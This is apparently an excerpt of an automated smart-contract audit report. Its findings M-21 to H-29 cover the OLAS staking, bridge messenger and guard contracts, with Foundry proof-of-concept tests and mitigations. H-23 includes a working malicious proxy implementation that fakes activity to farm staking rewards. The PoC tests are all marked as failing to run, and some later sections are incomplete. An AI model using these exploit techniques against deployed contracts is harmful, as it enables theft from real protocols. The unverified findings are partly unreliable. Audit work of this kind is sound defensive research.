```md
## [M-21]. Lack of rescue mechanism locks funds if bridge is deprecated or paused

## id: DWT9RExdut73r_2ONB5ET

## Derived From Pattern/Invariant
UnprotectedPauseOrStop

## Exploit Type
Dos

## Location
Bridge2BurnerGnosis.relayToL1Burner

## Finding Status: Valid
### Finding Status Justification: This is substantively the same issue as cHTZfN14l5r_MIayF8Ra2: l2TokenRelayer is immutable and there is no governance/owner-controlled withdrawal/sweep. If relayTokens reverts (bridge pause/upgrade/blacklist), relayToL1Burner is permanently unusable and OLAS is locked. The minimum threshold (100 OLAS) increases the amount-at-risk per relay attempt. The issue is reproducible with a relayer that reverts and is not dependent on hypothetical code changes. Impact is High because it can strand the full contract balance indefinitely.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `Bridge2BurnerGnosis` contract relies solely on the immutable `l2TokenRelayer` address to exit funds via `relayToL1Burner`. There is no mechanism to rescue funds, sweep excess tokens, or update the bridge address. If the Gnosis bridge contract is paused (reverting transactions), upgraded to a new address (making the old one invalid), or if the bridge blacklists the contract, all OLAS tokens held by the contract (and any future deposits) will be permanently locked. The contract enforces a `MIN_OLAS_BALANCE` of 100 OLAS, meaning funds are accumulated significantly before relaying, increasing the risk of loss during a bridge outage.

## Impact
Permanent loss of all assets held by the contract if the external bridge dependency fails, pauses, or changes address, as there is no administrative fallback or rescue function.

## Command to Run Test


## Proof of Concept
1. `Bridge2BurnerGnosis` holds 150 OLAS.
2. The `l2TokenRelayer` contract is paused and now reverts on `relayTokens` calls.
3. Calling `relayToL1Burner` reverts due to the bridge failure.
4. Since the contract has no `rescue` or `withdraw` function and the relayer address is immutable, the 150 OLAS are permanently stuck.

## Proof of Code
import "forge-std/Test.sol";
import {Bridge2BurnerGnosis} from "contracts/utils/Bridge2BurnerGnosis.sol";

contract MockBrokenBridge {
    function relayTokens(address, address, uint256) external {
        revert("Bridge Paused");
    }
}

contract MockToken {
    function approve(address, uint256) external returns (bool) {
        return true;
    }
    function balanceOf(address) external view returns (uint256) {
        return 200 ether;
    }
}

contract LockedFundsTest is Test {
    Bridge2BurnerGnosis bridge;
    MockToken token;
    MockBrokenBridge relayer;

    function setUp() public {
        token = new MockToken();
        relayer = new MockBrokenBridge();
        bridge = new Bridge2BurnerGnosis(address(token), address(relayer));
    }

    function testFundsLocked() public {
        // Bridge is broken, so relaying fails
        vm.expectRevert("Bridge Paused");
        bridge.relayToL1Burner();
        // Assert: No other function exists to withdraw funds
    }
}

## Suggested Mitigation
Implement a `rescueFunds(address token, uint256 amount)` function restricted to a governance role (e.g., `onlyOwner`) to allow recovering assets if the bridge fails.
```

### M-22 / `Y0oIK8JqwosDavMXFUtuz`
- Finding title: GuardCM `_verifySchedule` ignores ETH value allowing potential Timelock drainage
- Report lines: 2609-2712
```md
## [M-22]. GuardCM `_verifySchedule` ignores ETH value allowing potential Timelock drainage

## id: Y0oIK8JqwosDavMXFUtuz

## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AccessControl

## Location
GuardCM._verifySchedule

## Finding Status: Valid
### Finding Status Justification: In `_verifySchedule`, `abi.decode(payload, (address, uint256, bytes, ...))` explicitly discards the `uint256 value` (second tuple element). Authorization then only checks `(target, selector, chainId)` via `_verifyData` (or via the bridge verifier), never constraining ETH sent on Timelock execution. Thus, if CM can schedule and any allowlisted target call accepts nonzero ETH, CM can cause Timelock-held ETH to be spent/sent. Profitability depends on the allowlisted payable targets and their semantics, but the guard’s intended verification pipeline clearly omits `value`, so the issue is real.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
When the CM schedules a transaction via the Timelock using `schedule` or `scheduleBatch`, the Guard verifies the `target` and `payload` (selector/data) against the allowlist. However, it completely ignores the `value` (ETH amount) parameter in the decoded payload. The Timelock's `schedule` function accepts a `value` parameter which dictates how much ETH is sent to the target upon execution. This allows the CM to schedule transactions to allowlisted targets with arbitrary ETH values, potentially draining the Timelock's ETH balance if an allowlisted target accepts ETH (e.g., a bridge deposit function, a payable utility, or a WETH wrap function).

## Impact
The Community Multisig can drain all ETH held by the Timelock by scheduling calls to allowlisted targets with high `msg.value`.

## Command to Run Test


## Proof of Concept
1. Assume `WETH` is on the allowlist (target=WETH, selector=deposit).
2. The Timelock holds 100 ETH.
3. The CM calls `Timelock.schedule(WETH, 100 ether, encoded_deposit, ...)`.
4. The Guard's `checkTransaction` calls `_verifySchedule`.
5. `_verifySchedule` decodes the payload but discards the `value` field (the second return value of `abi.decode`).
6. The Guard verifies `WETH` and `deposit` are allowed.
7. The transaction is scheduled.
8. After the delay, the transaction is executed, sending 100 ETH from Timelock to WETH (effectively moving control of funds if CM has control over WETH or if the target is a bridge).

## Proof of Code
import "forge-std/Test.sol";
import {GuardCM} from "contracts/multisigs/GuardCM.sol";
import {Enum} from "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";

contract MockTimelock {}

contract ValueCheckTest is Test {
    GuardCM guard;
    address owner = address(new MockTimelock());
    address multisig = address(0x123);
    address governor = address(0x456);
    address allowedTarget = address(0x999);
    
    // schedule selector: schedule(address,uint256,bytes,bytes32,bytes32,uint256)
    bytes4 constant SCHEDULE = 0x06661abd;

    function setUp() public {
        guard = new GuardCM(owner, multisig, governor);
        
        // Whitelist the target
        address[] memory targets = new address[](1);
        targets[0] = allowedTarget;
        bytes4[] memory selectors = new bytes4[](1);
        selectors[0] = bytes4(0x11223344);
        uint256[] memory chainIds = new uint256[](1);
        chainIds[0] = block.chainid;
        bool[] memory statuses = new bool[](1);
        statuses[0] = true;
        
        vm.prank(owner);
        guard.setTargetSelectorChainIds(targets, selectors, chainIds, statuses);
    }

    function testValueIgnore() public {
        // Construct a schedule payload with high value
        // schedule(target, value=100ETH, data, ...)
        bytes memory innerData = abi.encodeWithSelector(bytes4(0x11223344));
        bytes memory schedulePayload = abi.encodeWithSelector(
            SCHEDULE,
            allowedTarget,
            uint256(100 ether), // VALUE IGNORED
            innerData,
            bytes32(0),
            bytes32(0),
            uint256(0)
        );

        // Check transaction
        // Should succeed despite high value
        vm.prank(multisig);
        guard.checkTransaction(
            owner,
            0,
            schedulePayload,
            Enum.Operation.Call,
            0, 0, 0, address(0), payable(0), hex"", address(0)
        );
    }
}

## Suggested Mitigation
In `_verifySchedule`, capture the `value` from `abi.decode` (currently ignored) and verify it is 0, or add a mechanism to restrict the maximum allowed value for scheduled transactions.
```

### H-23 / `GH7-K8dsdsSYwbVlMsj78`
- Finding title: StakingBase validation bypass via Proxy codehash check allows reward theft
- Report lines: 2713-2847
```md
## [H-23]. StakingBase validation bypass via Proxy codehash check allows reward theft

## id: GH7-K8dsdsSYwbVlMsj78

## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AuthByPass

## Location
StakingBase._stake

## Finding Status: Valid
### Finding Status Justification: Code path exists: StakingBase._stake validates a service multisig solely via `service.multisig.codehash == proxyHash`. For proxy-based multisigs (e.g., Gnosis Safe proxy), `codehash` authenticates only the proxy shell, not the delegated implementation (“master copy”). A service can therefore pass the proxyHash check while delegating to (or later being upgraded to) a malicious implementation that returns arbitrary nonces, letting ActivityChecker-based liveness checks pass without real activity. This is not mitigated elsewhere in StakingBase (no implementation allowlist, no master-copy slot read). It is permissionless if an attacker can stake a service whose multisig owners they control. Result is reward extraction/dilution, hence High impact. Requires attacker-controlled service/multisig setup, so Occasional likelihood.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `StakingBase._stake` function attempts to validate that a service's multisig is legitimate by checking `service.multisig.codehash == proxyHash`. This check assumes that the codehash of the multisig contract uniquely identifies authorized multisig implementations (e.g., Gnosis Safe). However, Gnosis Safe multisigs use a Proxy pattern where the codehash corresponds to the Proxy shell, not the implementation logic (Singleton). 

Because the Proxy codehash is constant regardless of the implementation it delegates to, an attacker can create a service using a standard Gnosis Safe Proxy that delegates to a malicious Singleton. This malicious implementation can manipulate `nonce()` values used by the `ActivityChecker` to determine liveness, allowing the attacker to bypass activity requirements and drain staking rewards without performing real transactions.

## Impact
High. Attackers can drain all staking rewards from the protocol without providing any service activity.

## Command to Run Test


## Proof of Concept
1. Attacker deploys a `MaliciousSingleton` contract with a `nonce()` function that returns `block.number` (simulating constant activity).
2. Attacker interacts with `ServiceRegistry` to create a service and deploy a multisig. The attacker supplies `MaliciousSingleton` as the implementation.
3. `ServiceRegistry` deploys a standard Gnosis Proxy pointing to `MaliciousSingleton`.
4. Attacker calls `StakingBase.stake(serviceId)`. The `codehash` check passes because the Proxy uses the standard bytecode.
5. The `StakingBase` contract accepts the service.
6. `checkpoint()` calls `ActivityChecker`, which calls `getMultisigNonces` on the Proxy. The Proxy delegates to `MaliciousSingleton`, returning fake incrementing nonces.
7. The liveness check passes, and the attacker accrues/claims rewards.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {StakingBase} from "../contracts/staking/StakingBase.sol";

// Mock contracts
contract MockRegistry {
    struct Service {
        uint96 securityDeposit; address multisig; bytes32 configHash; uint32 threshold;
        uint32 maxNumAgentInstances; uint32 numAgentInstances; uint8 state; uint32[] agentIds;
    }
    Service public service;
    function getService(uint256) external view returns (Service memory) { return service; }
    function getAgentParams(uint256) external view returns (uint256, uint256[] memory) { return (0, new uint256[](0)); }
    function safeTransferFrom(address, address, uint256) external {}
    function setService(address ms) external {
        service.multisig = ms; service.state = 4; // Deployed
    }
}

contract MockActivityChecker {
    function getMultisigNonces(address ms) external view returns (uint256[] memory) {
        (bool s, bytes memory d) = ms.staticcall(abi.encodeWithSignature("nonce()"));
        uint256 n = abi.decode(d, (uint256));
        uint256[] memory arr = new uint256[](1); arr[0] = n;
        return arr;
    }
    function isRatioPass(uint256[] memory, uint256[] memory, uint256) external pure returns (bool) { return true; }
}

// Minimal Proxy that matches a specific codehash but delegates to custom logic
contract MockProxy {
    address public implementation;
    constructor(address _impl) { implementation = _impl; }
    fallback() external { 
        address _impl = implementation;
        assembly { calldatacopy(0, 0, calldatasize()) let result := delegatecall(gas(), _impl, 0, calldatasize(), 0, 0) returndatacopy(0, 0, returndatasize()) return(0, returndatasize()) }
    }
}

contract MaliciousSingleton {
    function nonce() external view returns (uint256) { return block.number; }
}

contract ConcreteStaking is StakingBase {
    function initialize(StakingParams memory p) external { _initialize(p); }
    function _transfer(address, uint256) internal override {}
    function checkTokenStakingDeposit(uint256 s, uint256 d, uint32[] memory a) internal view override { _checkTokenStakingDeposit(s,d,a); }
}

contract StakingExploitTest is Test {
    ConcreteStaking staking;
    MockRegistry registry;
    MockActivityChecker checker;
    MockProxy proxy;
    MaliciousSingleton malicious;

    function testExploit() public {
        registry = new MockRegistry();
        checker = new MockActivityChecker();
        staking = new ConcreteStaking();
        malicious = new MaliciousSingleton();
        proxy = new MockProxy(address(malicious));

        // Init staking with the Proxy's codehash
        StakingBase.StakingParams memory params;
        params.proxyHash = address(proxy).codehash; // TRUSTED HASH
        params.serviceRegistry = address(registry);
        params.activityChecker = address(checker);
        params.maxNumServices = 10; params.rewardsPerSecond = 1e18; 
        params.livenessPeriod = 10; params.timeForEmissions = 100;
        params.minNumStakingPeriods = 1; params.maxNumInactivityPeriods = 1;
        params.minStakingDeposit = 10; params.numAgentInstances = 0;
        
        staking.initialize(params);

        // Setup service with the MockProxy (matches hash, but malicious logic)
        registry.setService(address(proxy));
        
        // Stake successfully despite malicious logic
        staking.stake(1);
        
        // Checkpoint accrues rewards based on fake nonce
        vm.warp(block.timestamp + 20);
        vm.roll(block.number + 10);
        staking.checkpoint();
        
        uint256 reward = staking.calculateStakingReward(1);
        assertGt(reward, 0, "Attacker farmed rewards with fake activity");
    }
}

## Suggested Mitigation
Do not rely on `codehash` to validate proxy behavior. Validate the implementation address (e.g., by reading the specific storage slot defined by the proxy standard) against an allowlist, or rely on the `ServiceRegistry` to strictly enforce authorized implementations during service deployment.
```

### H-24 / `T0qwMIcwp2WfhQvxm1Zcf`
- Finding title: Bridge permanently DoS'd due to unsafe assembly parsing in BridgeMessenger
- Report lines: 2848-2932
```md
## [H-24]. Bridge permanently DoS'd due to unsafe assembly parsing in BridgeMessenger

## id: T0qwMIcwp2WfhQvxm1Zcf

## Derived From Pattern/Invariant
UnsafeAssembyTypeCasts

## Exploit Type
Dos

## Location
WormholeMessenger.receiveWormholeMessages

## Finding Status: Valid
### Finding Status Justification: The vulnerable code path exists in `BridgeMessenger._processData`: it uses assembly `mload(add(data, i))` to assign to `uint96 value` and `uint32 payloadLength` without masking. With the documented packed format, `mload(add(data, 32))` reads `[target(20)|value(12)]`, so the stack word used as `value` contains the target in the upper bits. Solidity does not guarantee cleanup for variables written in assembly, so `if (value > address(this).balance)` compares the dirty 256-bit word and reverts for essentially any non-zero target, breaking all governance execution (DoS) and preventing fund movement through this mechanism. No guards/masking are present; reproducible with a single packed transaction.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `BridgeMessenger._processData`, the assembly block parses `target`, `value`, and `payloadLength` using `mload` without masking dirty high bits. 

When loading `value` (uint96) via `mload(add(data, 32))`, the instruction loads 32 bytes starting at `data[0]`. This 32-byte word contains the 20-byte `target` address in the highest 160 bits and the 12-byte `value` in the lowest 96 bits. The variable `value` is assigned this dirty 32-byte word. 

Critically, Solidity 0.8 does not automatically clean dirty high bits for stack variables initialized in assembly. When the code subsequently checks `if (value > address(this).balance)`, the comparison uses the full dirty value (approximately `target << 96`). Since `target` must be non-zero (checked later), `value` is interpreted as an enormously large number, causing the check to always fail and the transaction to revert with `InsufficientBalance`. 

Similarly, `payloadLength` is loaded with dirty high bits, which would cause `new bytes(payloadLength)` to revert due to out-of-gas/memory limits if execution reached that point.

## Impact
The bridge is functionally unusable for any message with a non-zero target address (which is all valid messages), as they will inevitably revert. This results in a permanent Denial of Service of the cross-chain governance system.

## Command to Run Test


## Proof of Concept
1. Deploy `WormholeMessenger`.
2. Construct a valid bridge message payload: `[20 bytes target][12 bytes value][4 bytes len]`. Let `target` = `0x01...01` (valid address), `value` = 0, `len` = 0.
3. Bytes: `0x01...0100...00000000`.
4. Call `receiveWormholeMessages` with this payload.
5. Inside `_processData`:
   - `target` is parsed. 
   - `value` is parsed from offset 32. The word loaded is `0x01...0100...00`. This equals `target << 96`.
   - `value > address(this).balance` checks `target << 96 > balance`. This is true.
   - Reverts `InsufficientBalance`.

## Proof of Code
contract VulnerabilityTest is Test {
    WormholeMessenger messenger;
    address relayer = address(0x123);
    bytes32 governor = bytes32(uint256(uint160(address(0x456))));
    uint16 chainId = 1;

    function setUp() public {
        messenger = new WormholeMessenger(relayer, governor, chainId);
        vm.deal(address(messenger), 100 ether);
    }

    function testDoS() public {
        // Construct valid message: target (20), value (12), len (4)
        address target = address(0xABC);
        uint96 value = 0;
        uint32 len = 0;
        bytes memory data = abi.encodePacked(target, value, len);
        
        vm.prank(relayer);
        // Expect revert due to insufficient balance (dirty bits making value huge)
        // Note: The revert is InsufficientBalance(huge_value, balance)
        vm.expectRevert(); 
        messenger.receiveWormholeMessages(data, new bytes[](0), governor, chainId, bytes32(uint256(1)));
    }
}

## Suggested Mitigation
Apply explicit bitmasks in the assembly block to clean high bits:

```solidity
target := and(mload(add(data, i)), 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
// ...
value := and(mload(add(data, i)), 0xFFFFFFFFFFFFFFFFFFFFFFFF)
// ...
payloadLength := and(mload(add(data, i)), 0xFFFFFFFF)
```
```

### H-25 / `VFTFb5TXtRQL35SjU9iFt`
- Finding title: DoS via unsafe assembly downcasting in BridgeMessenger._processData
- Report lines: 2933-3018
```md
## [H-25]. DoS via unsafe assembly downcasting in BridgeMessenger._processData

## id: VFTFb5TXtRQL35SjU9iFt

## Derived From Pattern/Invariant
UnsafeAssembyTypeCasts

## Exploit Type
Dos

## Location
WormholeMessenger._processData

## Finding Status: Valid
### Finding Status Justification: This is the same concrete vulnerability as T0qwMIcwp2WfhQvxm1Zcf / x5MBoE-mzbrwXZavKF_vx. In `BridgeMessenger._processData`, `value := mload(...)` and `payloadLength := mload(...)` assign full 256-bit words to smaller types without masking, and Solidity may treat them as already-clean. With packed `[target|value|len|payload]`, `value` picks up the target in high bits, causing `InsufficientBalance` to revert for virtually all valid messages, resulting in total bridge DoS. No existing safeguards (masks, bounds checks before use) are implemented.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `_processData` function in `BridgeMessenger.sol` (inherited by `WormholeMessenger` and others) uses inline assembly to unpack the `target`, `value`, and `payloadLength` fields from a packed byte array. It uses `mload` to read 32-byte words from calculated offsets but fails to mask the upper bits when assigning to `uint96 value` and `uint32 payloadLength`. 

Specifically:
1. `value` is loaded via `mload(add(data, 32))`. Due to the packed format `[target(20)][value(12)]...`, the 32 bytes read at this offset contain the 20-byte `target` in the most significant bits and the 12-byte `value` in the least significant bits. Because the high bits are not masked, the `value` variable (uint96) retains the `target` address data in its dirty upper bits.
2. When `if (value > address(this).balance)` is evaluated, Solidity uses the full dirty 256-bit value. Since `target` must be non-zero (enforced by a check), the effective value is `target << 96 | value`, which is an enormously large number exceeding any realistic balance.

This causes the `InsufficientBalance` check to revert for every valid cross-chain message with a non-zero target, resulting in a complete Denial of Service of the governance bridge.

## Impact
The governance bridge is completely non-functional. Legitimate governance messages from the L1 Timelock cannot be executed on L2, preventing any protocol upgrades or parameter changes.

## Command to Run Test


## Proof of Concept
1. Deploy `WormholeMessenger` with valid parameters.
2. Construct a valid packed payload representing a call to a target: `target = 0x123...` (20 bytes), `value = 0` (12 bytes), `payloadLength = 0` (4 bytes).
3. Call `receiveWormholeMessages` (simulating the Wormhole Relayer).
4. The transaction reverts with `InsufficientBalance` because the interpreted `value` includes the `target` address in its upper bits, making it vastly larger than the contract's balance.

## Proof of Code
contract MalformedPackingTest is Test {
    BridgeMessengerHarness messenger;

    function setUp() public {
        messenger = new BridgeMessengerHarness();
        vm.deal(address(messenger), 100 ether);
    }

    function testRevertDueToDirtyBits() public {
        // Construct valid payload: Target (non-zero), Value (0), Len (0)
        // Target: 0x00...01 (20 bytes)
        // Value: 0 (12 bytes)
        // Len: 0 (4 bytes)
        bytes memory data = abi.encodePacked(address(1), uint96(0), uint32(0));
        
        // Should succeed if logic was correct (0 <= 100 ether)
        // But reverts because 'value' is interpreted as (address(1) << 96)
        vm.expectRevert(); // InsufficientBalance
        messenger.processData(data);
    }
}

contract BridgeMessengerHarness is BridgeMessenger {
    function processData(bytes memory data) external {
        _processData(data);
    }
}

## Suggested Mitigation
Apply bitmasks to the loaded values in the assembly block to clear the dirty upper bits:

```solidity
// ...
i := add(i, 12)
// Mask to 96 bits (12 bytes)
value := and(mload(add(data, i)), 0xffffffffffffffffffffffff)

i := add(i, 4)
// Mask to 32 bits (4 bytes)
payloadLength := and(mload(add(data, i)), 0xffffffff)
// ...
```
```

### H-26 / `eUVQ3Y-bhAV6dGP8-o1qm`
- Finding title: Permanent DoS of BridgeMessenger due to dirty upper bits in assembly unpacking
- Report lines: 3019-3105
```md
## [H-26]. Permanent DoS of BridgeMessenger due to dirty upper bits in assembly unpacking

## id: eUVQ3Y-bhAV6dGP8-o1qm

## Derived From Pattern/Invariant
Unsafe Assembly usage resulting in dirty upper bits

## Exploit Type
Dos

## Location
OptimismMessenger.processMessageFromSource

## Finding Status: Valid
### Finding Status Justification: BridgeMessenger._processData uses inline assembly with mload(add(data,i)) and no masking. This is a real, reachable code path from OptimismMessenger.processMessageFromSource -> _processData. Critically, value is read at i=32 (data+32) which loads the first 32 bytes of the byte-stream: [target(20)][value(12)]. Since no mask is applied, assigning into uint96 in assembly leaves dirty upper bits, so value effectively becomes (target << 96) | value. The subsequent check value > address(this).balance will revert for any non-zero target (i.e., any real governance call), permanently bricking cross-chain execution. Solidity 0.8+ does not auto-clean upper bits for assembly assignments, and there is no alternative parsing path or guard to prevent this. A minimal PoC is any call into _processData with a non-zero target and value=0, which reverts InsufficientBalance.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `_processData` function in `BridgeMessenger.sol` uses inline assembly to unpack `target`, `value`, and `payloadLength` from the `data` byte array. It uses `mload` to load 32-byte words into smaller types (`address` (160 bits), `uint96` (96 bits), `uint32` (32 bits)) without masking the upper bits. In Solidity 0.8+, the compiler does not clean dirty upper bits for variables assigned in assembly. 

Due to the memory layout and the logic `i := add(i, 20); target := mload(add(data, i))`, the loaded word is misaligned and dirty. More critically, when loading `value` (uint96) at offset 32, the word loaded contains the `target` address in the most significant 160 bits (Big Endian layout: `[Target(20bytes)][Value(12bytes)]`). Consequently, the `value` variable, when cast to `uint256` for the balance check, is interpreted as `(Target << 96) | Value`. For any non-zero `target`, this value exceeds 2^96 (~79 billion ETH), causing the check `if (value > address(this).balance)` to always revert with `InsufficientBalance`. This renders the bridge completely non-functional for any valid governance action.

## Impact
The bridge is permanently unusable. Valid governance messages from L1 will always revert, preventing any updates to the source governor or execution of governance actions on L2. This effectively bricks the L2 governance control.

## Command to Run Test


## Proof of Concept
1. The L1 Timelock sends a valid governance message (e.g., to update a parameter) with `target = 0x123...`, `value = 0`, `payload = ...`.
2. The Optimism CDM calls `OptimismMessenger.processMessageFromSource(data)`.
3. The `_processData` function iterates to unpack the message.
4. It reads `value` using `mload`. Since `target` is non-zero, the upper bits of the 32-byte word containing `value` are non-zero (containing the address).
5. `value` is interpreted as a huge integer (> 2^96).
6. The check `value > address(this).balance` fails and the transaction reverts.
7. The governance action fails to execute.

## Proof of Code
pragma solidity ^0.8.23;
import "forge-std/Test.sol";
import "contracts/bridges/BridgeMessenger.sol";

contract ConcreteMessenger is BridgeMessenger {
    function processData(bytes memory data) external {
        _processData(data);
    }
}

contract MessengerTest is Test {
    ConcreteMessenger messenger;

    function setUp() public {
        messenger = new ConcreteMessenger();
        vm.deal(address(messenger), 1000 ether);
    }

    function testProcessDataReverts() public {
        // Create a valid packed payload: target (20 bytes) | value (12 bytes) | payloadLen (4 bytes)
        address target = address(0x1234567890123456789012345678901234567890);
        uint96 value = 1 ether;
        uint32 payloadLen = 0;
        
        bytes memory data = abi.encodePacked(target, value, payloadLen);
        
        // Expect revert due to dirty bits making 'value' huge
        // The error will be InsufficientBalance(huge_value, balance)
        vm.expectRevert();
        messenger.processData(data);
    }
}

## Suggested Mitigation
Apply bitmasks in the assembly block to clean the upper bits of the loaded variables.

Example fix:
```solidity
target := and(mload(add(data, i)), 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
i := add(i, 12)
value := and(mload(add(data, i)), 0xFFFFFFFFFFFFFFFFFFFFFFFF)
i := add(i, 4)
payloadLength := and(mload(add(data, i)), 0xFFFFFFFF)
```
```

### M-27 / `-duoplvQoyGXp3QZdv5qn`
- Finding title: Evicted services bypass reward forfeiture specification
- Report lines: 3106-3161
```md
## [M-27]. Evicted services bypass reward forfeiture specification

## id: -duoplvQoyGXp3QZdv5qn

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
AccountingInvariantViolation

## Location
StakingBase._unstake

## Finding Status: Valid
### Finding Status Justification: The provided protocol overview states eviction implies “reward forfeiture”. In code, eviction in `checkpoint()` only removes serviceIds from `setServiceIds` via `_evict`; it does not zero `mapServiceInfo[serviceId].reward`. In `_unstake(serviceId,false)`, the owner can still withdraw any stored `reward` regardless of eviction status (evicted services are detected by `inactivity > maxInactivityDuration`, but no forfeiture is enforced). Thus, an evicted service can still exit with accumulated rewards, contradicting the stated invariant. No internal safeguard enforces forfeiture; `forcedUnstake()` exists but is optional. This is economically meaningful (penalty bypass) but does not enable stealing others’ principal, so Medium impact, Occasional likelihood.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The protocol documentation and overview explicitly state that "Inactivity for more than N periods triggers automatic eviction and reward forfeiture." However, the implementation of `_unstake` in `StakingBase.sol` allows a service owner to claim all accumulated rewards even if the service has been evicted.

When a service is evicted via `checkpoint()`, it is removed from the `setServiceIds` array, stopping future reward accrual, but its `mapServiceInfo` entry remains intact with `sInfo.reward` containing previously earned rewards. The `unstake` function calls `_unstake(serviceId, false)`, which checks `sInfo.reward > 0` and transfers it to the owner. There is no check preventing reward payout for services in the `Evicted` state, nor is the reward zeroed out upon eviction.

## Impact
Protocol pays out rewards to inactive/evicted services that should have been forfeited according to the protocol specification and economic design.

## Command to Run Test


## Proof of Concept
1. Service Owner stakes a service.
2. Service becomes inactive for > `maxInactivityDuration`.
3. A `checkpoint()` is triggered (by keeper or other user). The service is identified as inactive and evicted (removed from active set).
4. Service Owner calls `unstake(serviceId)`.
5. `_unstake` executes. It does not check if the service was evicted. It reads `sInfo.reward` (which holds pre-eviction rewards).
6. `_withdraw` is called, sending funds to the owner.
7. Owner successfully exits with rewards, bypassing forfeiture.

## Proof of Code
import {Test} from "forge-std/Test.sol";
// ... Mock setup ...

contract ForfeitureTest is Test {
    // 1. Stake service
    // 2. Mock inactivity check to fail for extended period
    // 3. Call checkpoint() -> Service evicted
    // 4. Call unstake()
    // 5. Assert owner balance increased (Rewards NOT forfeited)
}

## Suggested Mitigation
In the `checkpoint` function, inside the eviction logic (`if (serviceInactivity[i] > maxInactivityDuration)`), explicitly zero out the accumulated reward for the evicted service: `mapServiceInfo[curServiceId].reward = 0;` before calling `_evict`.
```

### H-28 / `_yIRhjoh6JnbdNuWdpJpS`

## [H-28]. Contract is non-functional due to missing configuration interface

## id: _yIRhjoh6JnbdNuWdpJpS

## Derived From Pattern/Invariant
AccessControl

## Exploit Type
Dos

## Location
ProcessBridgedDataWormhole.N/A

## Finding Status: Valid
### Finding Status Justification: VerifyData declares a public mapping mapAllowedTargetSelectorChainIds used as the sole allowlist in _verifyData(). In the provided code, there is no constructor initialization and no external/public setter anywhere in VerifyData, VerifyBridgedData, or ProcessBridgedDataWormhole to populate this mapping. Therefore, for any (target, selector, chainId), the mapping lookup defaults to false and _verifyData() reverts with NotAuthorized. Since processBridgeData() always ends up calling _verifyBridgedData() -> _verifyData(), the deployed verifier cannot ever successfully verify any message, effectively bricking the intended cross-chain verification path. This is not documented as intended behavior and there is no compensating mechanism shown (e.g., owner-setter, initializer, or delegated host-storage pattern).
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `ProcessBridgedDataWormhole` contract inherits `VerifyData`, which defines the `mapAllowedTargetSelectorChainIds` mapping to authorize cross-chain calls. However, neither `ProcessBridgedDataWormhole` nor its parents provide any external function (e.g., `setTargetSelectorChainId`) to modify this mapping. As the verification logic `_verifyData` reverts if the key is not found in the map, and the map cannot be populated, the contract will permanently reject all verifications. This renders the contract unusable (DoS) unless it is intended to be used via `delegatecall` with a storage-compatible host that has setters (which introduces storage collision risks if not managed perfectly).

## Impact
The contract is functionally bricked; it cannot authorize any messages because the allowlist cannot be populated.

## Command to Run Test


## Proof of Concept
1. Deploy `ProcessBridgedDataWormhole`.
2. Attempt to verify any valid payload.
3. `_verifyData` checks `mapAllowedTargetSelectorChainIds`.
4. Since no setters exist, the map is empty (all false).
5. Reverts `NotAuthorized`.

## Proof of Code
function testBricked() public {
    ProcessBridgedDataWormhole verifier = new ProcessBridgedDataWormhole();
    // No function exists to allow a target.
    // Any call to processBridgeData reverts NotAuthorized.
}

## Suggested Mitigation
Add an `onlyOwner` authenticated function to `ProcessBridgedDataWormhole` (or `VerifyData`) to set `mapAllowedTargetSelectorChainIds`.
```

## [H-29]. Missing configuration setters render ProcessBridgedDataWormhole permanently unusable

## id: uxy7csxnlR9QBCvYX9Gou

## Derived From Pattern/Invariant
AccessControl

## Exploit Type

ProcessBridgedDataWormhole.N/A

## Finding Status: Valid
### Finding Status Justification: Same root cause as above: the verifier relies on VerifyData.mapAllowedTargetSelectorChainIds for authorization, but the provided code contains no way to ever set any entry (no setter, no initializer, no constructor seeding). As a result, _verifyData() always reverts NotAuthorized, and any attempt to use ProcessBridgedDataWormhole to validate a bridged payload fails. This is a permanent DoS/unusability issue given the code as written.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The contract `ProcessBridgedDataWormhole` relies on the inherited `mapAllowedTargetSelectorChainIds` mapping (from `VerifyData`) to authorize bridged messages. However, the provided codebase contains no functions to populate or update this mapping (e.g., no `setAllowedTargetSelectorChainId`), and no constructor to initialize it. Since `VerifyData` checks this mapping in `_verifyData` and reverts if the entry is false, and the mapping is permanently empty, the contract will reject every single message with `NotAuthorized`.

## Impact
The contract is functionally bricked upon deployment. It cannot verify any messages, effectively permanently disabling the cross-chain governance path it is meant to secure.

## Command to Run Test


## Proof of Concept
1. Deploy `ProcessBridgedDataWormhole`.
2. Observe there are no `external` or `public` functions to set `mapAllowedTargetSelectorChainIds`.
3. Call `processBridgeData` with any valid payload.
4. Execution reaches `_verifyData`, checks the empty mapping, and reverts `NotAuthorized`.

## Proof of Code
function test_ContractBricked() public {
    ProcessBridgedDataWormhole verifier = new ProcessBridgedDataWormhole();
    // No setter exists. mapAllowedTargetSelectorChainIds is empty.
    
    // Construct valid payload (assuming length check passes)
    bytes memory data = new bytes(324);
    // Set valid selector
    bytes4 sel = verifier.SEND_MESSAGE_REFUND();
    assembly { mstore(add(data, 32), sel) }
    
    // Expect NotAuthorized (or WrongSelector/Length if not carefully crafted, but ultimately NotAuthorized)
    // Here we expect revert because we can't authorize the target
    vm.expectRevert();
    verifier.processBridgeData(data, address(0), 1);
}

## Suggested Mitigation
